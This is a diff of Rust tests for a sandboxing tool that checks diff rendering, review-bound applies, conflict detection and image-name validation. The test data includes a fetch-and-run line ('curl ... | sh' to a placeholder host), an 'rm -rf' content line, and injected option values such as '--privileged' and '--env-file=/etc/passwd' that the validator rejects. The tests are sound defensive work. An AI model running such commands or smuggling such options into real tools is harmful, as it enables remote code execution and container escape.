         symlink("alias/../.GIT/hooks", ws.join("hooks")).unwrap();
-        let e = apply(&paths, &m.id, false, false).unwrap_err().to_string();
+        let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
         assert!(e.contains("into .git"), "{e}");
+    }
+
+    #[test]
+    fn diff_is_rendered_without_the_workspaces_git_attributes() {
+        let (paths, project, m, ws) = setup("render", &[("run.sh", "#!/bin/sh\necho ok\n"), ("same", "s"), ("gone", "g\n")]);
+        assert!(Command::new("git").arg("init").arg("-q").arg(&project).status().unwrap().success());
+        std::fs::write(ws.join(".gitattributes"), "* -diff\n*.sh filter=lfs diff=x\n").unwrap();
+        std::fs::write(ws.join("run.sh"), "#!/bin/sh\ncurl https://example.invalid/x | sh\n").unwrap();
+        std::fs::remove_file(ws.join("gone")).unwrap();
+        symlink("run.sh", ws.join("lnk")).unwrap();
+        std::fs::write(ws.join("bin"), b"\x00\x01").unwrap();
+        // The project is a git repository, where reviewers usually run `rekcod sandbox diff`.
+        let p = patch(&paths, &m.id).unwrap().patch;
+        assert!(p.contains("diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,2 @@\n #!/bin/sh\n-echo ok\n+curl https://example.invalid/x | sh\n"), "{p}");
+        assert!(
+            p.contains("diff --git a/.gitattributes b/.gitattributes\nnew file mode 100644\n--- /dev/null\n+++ b/.gitattributes\n"),
+            "{p}"
+        );
+        assert!(p.contains("diff --git a/gone b/gone\ndeleted file mode 100644\n--- a/gone\n+++ /dev/null\n@@ -1 +0,0 @@\n-g\n"), "{p}");
+        assert!(
+            p.contains("new file mode 120000\n--- /dev/null\n+++ b/lnk\n@@ -0,0 +1 @@\n+run.sh\n\\ No newline at end of file\n"),
+            "{p}"
+        );
+        assert!(p.contains("Binary files /dev/null and b/bin differ"), "{p}");
+        assert!(!p.contains("same"), "{p}");
+        // `git apply` takes it, for remote users told to apply the patch themselves.
+        std::fs::remove_file(ws.join("bin")).unwrap();
+        std::fs::set_permissions(ws.join("same"), std::fs::Permissions::from_mode(0o755)).unwrap();
+        let p = patch(&paths, &m.id).unwrap().patch;
+        let out = Command::new("git")
+            .args(["apply", "--check", "-"])
+            .current_dir(&project)
+            .stdin(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+            .unwrap();
+        out.stdin.as_ref().unwrap().write_all(p.as_bytes()).unwrap();
+        let out = out.wait_with_output().unwrap();
+        assert!(out.status.success(), "{}\n{p}", String::from_utf8_lossy(&out.stderr));
+    }
+
+    #[test]
+    fn a_fork_judges_the_mac_by_its_parents_manifest() {
+        let (paths, project, parent, _) = setup("fork", &[("keep.txt", "k"), ("script.sh", "s")]);
+        let child = Paths::at(root(&paths).join("forkchld")).unwrap();
+        clone_workspace(&find(&paths, &parent.id).unwrap(), &child.home).unwrap();
+        let c = Sandbox { meta: Meta { id: "forkchld".into(), created: now() - 2, ..parent.clone() }, paths: child };
+        c.save().unwrap();
+        assert!(c.manifest().is_some());
+        // The Mac chmods a file and moves one in with an old mtime; the fork changed neither
+        // and deletes nothing.
+        let ws = c.ws();
+        std::fs::write(ws.join("keep.txt"), "k2").unwrap();
+        std::fs::set_permissions(project.join("keep.txt"), std::fs::Permissions::from_mode(0o600)).unwrap();
+        let e = apply(&paths, "forkchld", true, None).unwrap_err().to_string();
+        assert!(e.ends_with("since the sandbox copied it: keep.txt"), "{e}");
+        // Without a manifest (an older sandbox), the inode change still counts.
+        std::fs::remove_file(c.paths.home.join("manifest.json")).unwrap();
+        std::fs::write(project.join("hostnew.txt"), "h").unwrap();
+        let old = std::fs::File::options().write(true).open(project.join("hostnew.txt")).unwrap();
+        old.set_modified(UNIX_EPOCH + std::time::Duration::from_secs(1_577_836_800)).unwrap();
+        let e = apply(&paths, "forkchld", true, None).unwrap_err().to_string();
+        assert!(e.contains("hostnew.txt") && e.contains("keep.txt"), "{e}");
+        assert!(project.join("hostnew.txt").exists());
+    }
+
+    #[test]
+    fn a_running_command_keeps_the_idle_clock_fresh() {
+        let f = tmp("busy").join("last-used");
+        touch(&f);
+        let past = SystemTime::now() - std::time::Duration::from_secs(3600);
+        std::fs::File::options().write(true).open(&f).unwrap().set_modified(past).unwrap();
+        let age = || std::fs::metadata(&f).unwrap().modified().unwrap().elapsed().unwrap_or_default();
+        let busy = Busy::touching(f.clone(), std::time::Duration::from_millis(50));
+        std::thread::sleep(std::time::Duration::from_millis(200));
+        assert!(age() < std::time::Duration::from_millis(150), "{:?}", age());
+        let t0 = Instant::now();
+        drop(busy);
+        assert!(t0.elapsed() < std::time::Duration::from_millis(100));
+        std::thread::sleep(std::time::Duration::from_millis(200));
+        assert!(age() >= std::time::Duration::from_millis(150));
+    }
+
+    #[test]
+    fn a_failed_apply_records_what_it_wrote() {
+        let (paths, project, m, ws) = setup("partial", &[("keep", "k")]);
+        std::fs::write(ws.join("a"), "first").unwrap();
+        std::fs::write(ws.join("b"), "second").unwrap();
+        std::fs::set_permissions(ws.join("b"), std::fs::Permissions::from_mode(0o000)).unwrap();
+        let ch = changes(&project, &ws);
+        assert_eq!(paths_of(&ch), vec![('A', "a"), ('A', "b")]);
+        assert!(apply_from(find(&paths, &m.id).unwrap(), &ws, ch, false).is_err());
+        std::fs::set_permissions(ws.join("b"), std::fs::Permissions::from_mode(0o644)).unwrap();
+        assert_eq!(std::fs::read_to_string(project.join("a")).unwrap(), "first");
+        assert!(find(&paths, &m.id).unwrap().manifest().unwrap().contains_key("a"));
+        // So the retry writes b without calling a a conflict.
+        assert_eq!(paths_of(&apply(&paths, &m.id, false, None).unwrap()), vec![('A', "b")]);
+    }
+
+    #[test]
+    fn a_case_or_normalization_rename_applies() {
+        for (from, to) in [("readme.md", "README.md"), ("caf\u{e9}.txt", "cafe\u{301}.txt")] {
+            let (paths, project, m, ws) = setup("rename", &[(from, "doc"), ("other", "o")]);
+            if !project.join(to).exists() {
+                continue; // a case- or normalization-sensitive volume: two separate names
+            }
+            std::fs::rename(ws.join(from), ws.join(to)).unwrap();
+            std::fs::write(ws.join("other"), "o2").unwrap();
+            let r = patch(&paths, &m.id).unwrap();
+            assert!(r.changes.iter().any(|c| c.kind == 'A' && c.path == to), "{:?}", r.changes);
+            apply(&paths, &m.id, false, Some(&r.review)).unwrap();
+            let names: Vec<String> = std::fs::read_dir(&project).unwrap().map(|e| e.unwrap().file_name().into_string().unwrap()).collect();
+            assert!(names.contains(&to.to_string()) && !names.contains(&from.to_string()), "{names:?}");
+            assert_eq!(std::fs::read_to_string(project.join("other")).unwrap(), "o2");
+        }
+    }
+
+    #[test]
+    fn hostile_workspace_entries_neither_hang_nor_stick() {
+        let (paths, _, m, ws) = setup("hostile", &[("f", "x")]);
+        // A link to a FIFO is shown as a link; nothing opens the FIFO.
+        let fifo = std::ffi::CString::new(ws.join("pipe").as_os_str().as_bytes()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(fifo.as_ptr(), 0o644) }, 0);
+        symlink("pipe", ws.join("lnk")).unwrap();
+        std::fs::write(ws.join("big"), vec![b'a'; (MAX_DIFF_FILE + 1) as usize]).unwrap();
+        let (p, id) = (paths.clone(), m.id.clone());
+        let t = std::thread::spawn(move || patch(&p, &id).unwrap());
+        let t0 = Instant::now();
+        while !t.is_finished() && t0.elapsed() < std::time::Duration::from_secs(10) {
+            std::thread::sleep(std::time::Duration::from_millis(20));
+        }
+        assert!(t.is_finished(), "diff hung");
+        let r = t.join().unwrap();
+        assert_eq!(paths_of(&r.changes), vec![('A', "big"), ('A', "lnk")]);
+        assert!(r.patch.contains("+pipe\n") && r.patch.contains("rekcod: not shown, over 4 MiB"), "{}", r.patch);
+        // A directory the sandbox chmods to 000: diff names it, rm still removes everything.
+        std::fs::remove_file(ws.join("lnk")).unwrap();
+        std::fs::create_dir_all(ws.join("sub/deep")).unwrap();
+        std::fs::write(ws.join("sub/deep/x"), "x").unwrap();
+        std::fs::set_permissions(ws.join("sub"), std::fs::Permissions::from_mode(0o000)).unwrap();
+        let e = patch(&paths, &m.id).unwrap_err().to_string();
+        assert!(e.contains("sub in the workspace"), "{e}");
+        rm(&paths, std::slice::from_ref(&m.id), false).unwrap();
+        assert!(!root(&paths).join(&m.id).exists());
+    }
+
+    #[test]
+    fn the_patch_shows_what_apply_writes() {
+        let (paths, project, m, ws) = setup("shown", &[("f", "x\n"), ("g", "y\n")]);
+        // A content line naming the project path stays as written.
+        let line = format!("rm -rf data{}/keep\na{}/x\n", project.display(), project.display());
+        std::fs::write(ws.join("f"), &line).unwrap();
+        std::fs::set_permissions(ws.join("g"), std::fs::Permissions::from_mode(0o666)).unwrap();
+        let p = patch(&paths, &m.id).unwrap().patch;
+        assert!(p.contains(&format!("+rm -rf data{}/keep\n+a{}/x\n", project.display(), project.display())), "{p}");
+        assert!(p.contains("diff --git a/g b/g\nold mode 100644\nnew mode 100666\n"), "{p}");
+    }
+
+    #[test]
+    fn directories_and_names_like_dependencies_are_changes() {
+        let (paths, project, m, ws) =
+            setup("dirs", &[("src/a.rs", "a"), ("old/gone", "g"), ("node_modules/x", "mac"), ("pkg/target/t", "t")]);
+        std::fs::create_dir_all(ws.join("src/target")).unwrap();
+        std::fs::write(ws.join("src/target/mod.rs"), "m").unwrap();
+        std::fs::write(ws.join("target"), "a file").unwrap();
+        std::fs::create_dir(ws.join("emptynew")).unwrap();
+        std::fs::create_dir(ws.join("private")).unwrap();
+        std::fs::write(ws.join("private/key"), "k").unwrap();
+        std::fs::set_permissions(ws.join("private"), std::fs::Permissions::from_mode(0o700)).unwrap();
+        std::fs::remove_dir_all(ws.join("old")).unwrap();
+        // Dependency directories the project has too stay out, wherever they are.
+        std::fs::write(ws.join("node_modules/x"), "linux").unwrap();
+        std::fs::write(ws.join("pkg/target/t"), "linux").unwrap();
+        let r = patch(&paths, &m.id).unwrap();
+        assert_eq!(
+            paths_of(&r.changes),
+            vec![
+                ('A', "emptynew"),
+                ('D', "old"),
+                ('D', "old/gone"),
+                ('A', "private"),
+                ('A', "private/key"),
+                ('A', "src/target"),
+                ('A', "src/target/mod.rs"),
+                ('A', "target")
+            ]
+        );
+        assert_eq!(r.not_compared, vec!["node_modules".to_string(), "pkg/target".to_string()]);
+        assert!(r.patch.contains("rekcod: new directory private, mode 0700\n"), "{}", r.patch);
+        apply(&paths, &m.id, false, Some(&r.review)).unwrap();
+        assert!(project.join("emptynew").is_dir() && !project.join("old").exists());
+        assert_eq!(std::fs::metadata(project.join("private")).unwrap().permissions().mode() & 0o777, 0o700);
+        assert_eq!(std::fs::read_to_string(project.join("src/target/mod.rs")).unwrap(), "m");
+        assert_eq!(std::fs::read_to_string(project.join("node_modules/x")).unwrap(), "mac");
+        assert!(apply(&paths, &m.id, true, None).unwrap().is_empty());
+    }
+
+    #[test]
+    fn the_manifest_is_what_was_cloned() {
+        let (paths, project, m, ws) = setup("cloned", &[("f", "as cloned")]);
+        // An editor saves between the clone and the manifest walk.
+        std::fs::write(project.join("f"), "saved on the Mac after the clone").unwrap();
+        let s = find(&paths, &m.id).unwrap();
+        s.save_manifest(&manifest(&ws)).unwrap();
+        std::fs::write(ws.join("other"), "x").unwrap();
+        let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
+        assert!(e.ends_with("since the sandbox copied it: f"), "{e}");
+        assert_eq!(std::fs::read_to_string(project.join("f")).unwrap(), "saved on the Mac after the clone");
+    }
+
+    #[test]
+    fn a_failed_create_leaves_nothing_behind() {
+        let base = tmp("unmade");
+        let project = base.join("p");
+        std::fs::create_dir_all(project.join("locked")).unwrap();
+        std::fs::write(project.join("locked/x"), "x").unwrap();
+        std::fs::set_permissions(project.join("locked"), std::fs::Permissions::from_mode(0o000)).unwrap();
+        let paths = Paths { home: base.join("home") };
+        let o = CreateOptions { dir: Some(project.clone()), image: Some("alpine".into()), ..Default::default() };
+        let e = create(&paths, o);
+        std::fs::set_permissions(project.join("locked"), std::fs::Permissions::from_mode(0o755)).unwrap();
+        let left: Vec<_> = std::fs::read_dir(root(&paths)).unwrap().map(|e| e.unwrap().path()).filter(|p| p.is_dir()).collect();
+        assert!(e.is_err() && left.is_empty(), "{:?} {left:?}", e.err());
+    }
+
+    #[test]
+    fn images_are_references_not_options() {
+        for ok in ["debian:trixie-slim", "ghcr.io/astral-sh/uv:python3.14-bookworm-slim", "node@sha256:abc123", "localhost:5000/x"] {
+            assert!(check_image(ok).is_ok(), "{ok}");
+        }
+        for bad in ["--privileged", "--env-file=/etc/passwd", "-v", "", "a b", "x;y", "a\nb"] {
+            assert!(check_image(bad).is_err(), "{bad}");
+        }
+        let base = tmp("image");
+        let paths = Paths { home: base.join("home") };
+        let o = CreateOptions { dir: Some(base.clone()), image: Some("--privileged".into()), ..Default::default() };
+        assert!(create(&paths, o).unwrap_err().to_string().contains("bad image"));
+        assert!(!root(&paths).exists());
+    }
+
+    #[test]
+    fn prune_takes_old_stopped_sandboxes_and_leftovers() {
+        let (paths, project, old, _) = setup("prune", &[("f", "x")]);
+        let fresh = fake(&paths, &project, |_| {});
+        let fleet = fake(&paths, &project, |m| m.created = 1);
+        std::fs::write(root(&paths).join(&fleet.id).join(crate::fleet::FLEET_MARKER), b"").unwrap();
+        let s = find(&paths, &old.id).unwrap();
+        Sandbox { meta: Meta { created: 1, ..s.meta.clone() }, paths: Paths { home: s.paths.home.clone() } }.save().unwrap();
+        let used = s.paths.home.join("run/last-used");
+        std::fs::create_dir_all(used.parent().unwrap()).unwrap();
+        std::fs::File::create(&used).unwrap().set_modified(UNIX_EPOCH + std::time::Duration::from_secs(1)).unwrap();
+        let leftover = root(&paths).join("zzzzzzzz");
+        std::fs::create_dir_all(leftover.join("vm")).unwrap();
+        let mut gone = vec![];
+        prune(&paths, 3600, &mut |id| gone.push(id.to_string())).unwrap();
+        // The leftover is new: one being made right now looks the same.
+        assert_eq!(gone, vec![old.id.clone()]);
+        std::fs::File::open(&leftover).unwrap().set_modified(UNIX_EPOCH + std::time::Duration::from_secs(1)).unwrap();
+        gone.clear();
+        prune(&paths, 3600, &mut |id| gone.push(id.to_string())).unwrap();
+        assert_eq!(gone, vec!["zzzzzzzz".to_string()]);
+        assert!(find(&paths, &fresh.id).is_ok() && find(&paths, &fleet.id).is_ok());
+    }
+
+    #[test]
+    fn links_and_leftovers_apply_cleanly() {
+        let base = tmp("links-at-copy");
+        let project = base.join("p");
+        std::fs::create_dir_all(&project).unwrap();
+        std::fs::write(project.join("f"), "f").unwrap();
+        std::fs::write(project.join("g"), "g").unwrap();
+        symlink("f", project.join("l")).unwrap();
+        let paths = Paths { home: base.join("home") };
+        let m = fake(&paths, &project, |_| {});
+        let ws = root(&paths).join(&m.id).join("ws");
+        // A link the project had, retargeted in the sandbox: the clone's manifest entry for it
+        // must match the Mac's, or this is a conflict.
+        std::fs::remove_file(ws.join("l")).unwrap();
+        symlink("g", ws.join("l")).unwrap();
+        // What a killed apply leaves in the project is neither shown nor deleted.
+        std::fs::write(project.join(".rekcod-123-0-f"), "half").unwrap();
+        assert_eq!(paths_of(&apply(&paths, &m.id, false, None).unwrap()), vec![('M', "l")]);
+        assert_eq!(std::fs::read_link(project.join("l")).unwrap(), Path::new("g"));
+        assert!(project.join(".rekcod-123-0-f").exists());
+    }
+
+    #[test]
+    fn mount_sandboxes_share_every_git_read_only() {
+        let base = tmp("mount-git");
+        let project = base.join("p");
+        std::fs::create_dir_all(project.join("sub")).unwrap();
+        // A worktree: `.git` is a file.
+        std::fs::write(project.join(".git"), "gitdir: /elsewhere/.git/worktrees/p\n").unwrap();
+        std::fs::write(project.join("sub/.git"), "gitdir: ../.git/modules/sub\n").unwrap();
+        let paths = Paths { home: base.join("home") };
+        let m = fake(&paths, &project, |m| m.mode = "mount".into());
+        let s = find(&paths, &m.id).unwrap();
+        std::fs::write(s.paths.home.join("git.json"), serde_json::to_vec(&s.git_now()).unwrap()).unwrap();
+        let a = s.workspace_args().join(" ");
+        let p = project.display();
+        for r in [".git", "sub/.git"] {
+            assert!(a.contains(&format!("-v {p}/{r}:{p}/{r}:ro")), "{r}: {a}");
+        }
+        assert!(!s.warn_git());
+        std::fs::create_dir_all(project.join("new/.git")).unwrap();
+        assert!(s.warn_git());
     }
 
     #[test]
     fn apply_writes_exactly_what_was_reviewed() {
         let (paths, project, m, ws) = setup("review", &[("f", "old")]);
         std::fs::write(ws.join("f"), "reviewed-A").unwrap();
-        assert_eq!(paths_of(&patch(&paths, &m.id).unwrap().0), vec![('M', "f")]);
+        let a = patch(&paths, &m.id).unwrap();
+        assert_eq!(paths_of(&a.changes), vec![('M', "f")]);
         std::fs::write(ws.join("f"), "unreviewed-B").unwrap();
-        apply(&paths, &m.id, false, true).unwrap();
+        apply(&paths, &m.id, false, Some(&a.review)).unwrap();
         assert_eq!(std::fs::read_to_string(project.join("f")).unwrap(), "reviewed-A");
+        // Someone else's diff (the agent's, through MCP) replaces the reviewed copy: the
+        // human's review ID no longer applies anything.
+        std::fs::write(project.join("f"), "old").unwrap();
+        let m = fake(&paths, &project, |_| {});
+        let ws = root(&paths).join(&m.id).join("ws");
+        std::fs::write(ws.join("f"), "reviewed-A").unwrap();
+        let human = patch(&paths, &m.id).unwrap();
+        std::fs::write(ws.join("f"), "unreviewed-B").unwrap();
+        let agent = patch(&paths, &m.id).unwrap();
+        assert_ne!(human.review, agent.review);
+        let e = apply(&paths, &m.id, false, Some(&human.review)).unwrap_err().to_string();
+        assert!(e.contains("another diff"), "{e}");
+        assert!(apply(&paths, &m.id, false, Some("0123")).is_err());
+        assert_eq!(std::fs::read_to_string(project.join("f")).unwrap(), "old");
         // A diff waits for an apply (or another diff) holding the sandbox's lock.
         let home = root(&paths).join(&m.id);
         let lock = review_lock(&home).unwrap();
+        std::fs::write(ws.join("f"), "unreviewed-C").unwrap();
         let (p, id) = (paths.clone(), m.id.clone());
-        let t = std::thread::spawn(move || patch(&p, &id).map(|(ch, _)| ch.len()));
+        let t = std::thread::spawn(move || patch(&p, &id).map(|r| r.changes.len()));
         std::thread::sleep(std::time::Duration::from_millis(300));
         assert!(!t.is_finished());
-        assert_eq!(std::fs::read_to_string(home.join("reviewed/f")).unwrap(), "reviewed-A");
+        assert_eq!(std::fs::read_to_string(home.join("reviewed/f")).unwrap(), "unreviewed-B");
         drop(lock);
         assert_eq!(t.join().unwrap().unwrap(), 1);
-        assert_eq!(std::fs::read_to_string(home.join("reviewed/f")).unwrap(), "unreviewed-B");
+        assert_eq!(std::fs::read_to_string(home.join("reviewed/f")).unwrap(), "unreviewed-C");
         // The copy is read without following links: a directory swapped for a link, inside
         // the copy or out to a Mac path, is never read through.
         let (inside, outside) = (tmp("review-inside"), tmp("review-outside"));
@@ -1612,15 +2507,15 @@ mod tests {
         let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
         let was = mode(&project.join("f"));
         std::fs::set_permissions(project.join("f"), std::fs::Permissions::from_mode(0o600)).unwrap();
-        let e = apply(&paths, &m.id, true, false).unwrap_err().to_string();
+        let e = apply(&paths, &m.id, true, None).unwrap_err().to_string();
         assert!(e.ends_with("since the sandbox copied it: f"), "{e}");
         assert_eq!(mode(&project.join("f")), 0o600);
         std::fs::set_permissions(project.join("f"), std::fs::Permissions::from_mode(was)).unwrap();
-        assert!(apply(&paths, &m.id, true, false).unwrap().is_empty());
+        assert!(apply(&paths, &m.id, true, None).unwrap().is_empty());
         std::fs::set_permissions(ws.join("g"), std::fs::Permissions::from_mode(0o755)).unwrap();
-        assert_eq!(paths_of(&apply(&paths, &m.id, false, false).unwrap()), vec![('M', "g")]);
+        assert_eq!(paths_of(&apply(&paths, &m.id, false, None).unwrap()), vec![('M', "g")]);
         assert_eq!(mode(&project.join("g")), 0o755);
-        assert!(apply(&paths, &m.id, true, false).unwrap().is_empty());
+        assert!(apply(&paths, &m.id, true, None).unwrap().is_empty());
     }
 
     #[test]
@@ -1634,27 +2529,28 @@ mod tests {
         std::fs::write(&file, serde_json::to_vec(&old).unwrap()).unwrap();
         std::fs::remove_dir_all(ws.join("a")).unwrap();
         std::fs::write(ws.join("a"), "a file now").unwrap();
-        assert_eq!(paths_of(&patch(&paths, &m.id).unwrap().0), vec![('A', "a"), ('D', "a/child"), ('D', "a/sub/deep")]);
-        apply(&paths, &m.id, false, true).unwrap();
+        let r = patch(&paths, &m.id).unwrap();
+        assert_eq!(paths_of(&r.changes), vec![('A', "a"), ('D', "a/child"), ('D', "a/sub"), ('D', "a/sub/deep")]);
+        apply(&paths, &m.id, false, Some(&r.review)).unwrap();
         assert_eq!(std::fs::read_to_string(project.join("a")).unwrap(), "a file now");
         // And back: the file replaced by a directory.
         std::fs::remove_file(ws.join("a")).unwrap();
         std::fs::create_dir(ws.join("a")).unwrap();
         std::fs::write(ws.join("a/x"), "dir again").unwrap();
-        apply(&paths, &m.id, false, false).unwrap();
+        apply(&paths, &m.id, false, None).unwrap();
         assert_eq!(std::fs::read_to_string(project.join("a/x")).unwrap(), "dir again");
         // A conflict only when the Mac changed something under the directory.
         let (paths, project, m, ws) = setup("dir2file-host", &[("d/child", "x"), ("e/child", "x"), ("e/node_modules/pkg", "p")]);
         std::fs::remove_dir_all(ws.join("d")).unwrap();
         std::fs::write(ws.join("d"), "file").unwrap();
         std::fs::write(project.join("d/new"), "made on the Mac").unwrap();
-        let e = apply(&paths, &m.id, false, false).unwrap_err().to_string();
+        let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
         assert!(e.ends_with("since the sandbox copied it: d/new"), "{e}");
         std::fs::remove_file(project.join("d/new")).unwrap();
         // One holding what apply leaves alone (node_modules) is refused before anything is written.
         std::fs::remove_dir_all(ws.join("e")).unwrap();
         std::fs::write(ws.join("e"), "file").unwrap();
-        let e = apply(&paths, &m.id, false, false).unwrap_err().to_string();
+        let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
         assert!(e.contains("e/node_modules"), "{e}");
         assert!(project.join("d/child").exists() && project.join("e/child").exists());
     }
@@ -1689,8 +2585,7 @@ pub(crate) mod testing {
         };
         edit(&mut meta);
         let s = Sandbox { meta, paths: Paths { home } };
-        clonefile(&s.meta.project, &s.ws()).unwrap();
-        s.save_manifest(&manifest(&s.meta.project)).unwrap();
+        s.copy_project().unwrap();
         s.save().unwrap();
         s.meta
     }
